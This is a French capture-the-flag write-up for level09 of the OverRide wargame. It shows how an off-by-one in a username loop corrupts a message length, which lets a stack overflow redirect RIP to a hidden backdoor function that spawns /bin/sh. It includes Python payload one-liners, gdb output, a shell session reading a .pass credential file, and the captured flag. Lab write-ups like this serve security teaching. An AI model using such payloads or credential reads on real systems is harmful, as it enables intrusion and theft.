
## LEVEL 09

Lorsqu'on lance le programme celui-ci nous demande un nom d'utilisateur et un msg.

```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: asaba
>: Welcome, asaba
>: Msg @Unix-Dude
>>: hi
>: Msg sent!
```

Dans le décompiler on remarque 4 fonctions intéressante.

    handle_msg()
    set_msg()
    set_username()
    secret_backdoor()

En analysant le programme on remarque que les entrées se suivent dans la mémoire, comme dans une structure !

On remarque aussi que le programme est en 64 bits, ce qui va nous servir pour plus tard.

On a donc :

```
struct  msg{  
   char msg[140];
   char username[40];
   int msg_len;
} msg;
```

On trouve les buffers grâce à cette ligne 

    strncpy(arg1, &src, (arg1 + 0xb4));
    arg1		-> Première variable
    arg1 + 0xb4	-> arg1 + 180 -> msg_len

Il y a donc 180 octets entre la première variable et la dernière, on sait que la première variable à un buffer de 140, la deuxième variable à donc un buffer de 40. 
    

handle_msg appelle ensuite set_username qui remplit le champs username de la structure. On a alors une boucle for, mais celle-ci comporte une petit erreur, elle va jusqu'à 41 (0x29) et non 40 (0x28).

Il y'a a donc un octet que l'ont peut overflow. Le programme ne segfault pas car lorsque l'on dépasse ce buffer c'est la prochaine variable de la structure qui va se remplir donc : `msg_len`

Comme vu plus haut, `msg_len` est utilisé dans le `strncpy()` on va donc pouvoir grâce à l'username mettre un nombre choisis dans `msg_len`, on met donc le maximum possible dans 1 octet c'est à dire : 0xff.

On peut essayer de créer un début de payload :

    $ python -c 'print "a" * 40 + "\xff" + "\n" + "a" * 140' > /tmp/payload

On le lance : 

```
level09@OverRide:~$ cat /tmp/payload - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒>: Msg @Unix-Dude
>>: >: Msg sent!

Segmentation fault (core dumped)
```
On arrive à obtenir un segfault.

Pour la suite il va falloir utiliser cet overflow pour push l'adresse de la fonction `secret_backdoor()` qui n'est pas appellée. Celle-ci appelle `system(string)`  on va donc devoir reussir à changer l'EIP et entrer la commande que l'on veut comme argument.

On récupère l'adresse de cette fonction :
 ```
 (gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
 ```

Vu que le programme est en x64 bit, les adresses mémoires font 8 octets et on ne cherche pas l'EIP, mais l'RIP.

Pour ça on trouve le début du buffer de RBP :

    0x0000000000000906 <+70>:    lea    -0xc0(%rbp),%rax

    0xc0 = 192

Et pour taper dans le registre suivant, on ajoute 8 octets on obtient alors l'offset de l'RIP.

On peut maintenant construire notre payload complet :

    $ python -c 'print "a" * 40 + "\xff" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" "/bin/sh"' > /tmp/payload

```
level09@OverRide:~$ cat /tmp/payload - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBu
```
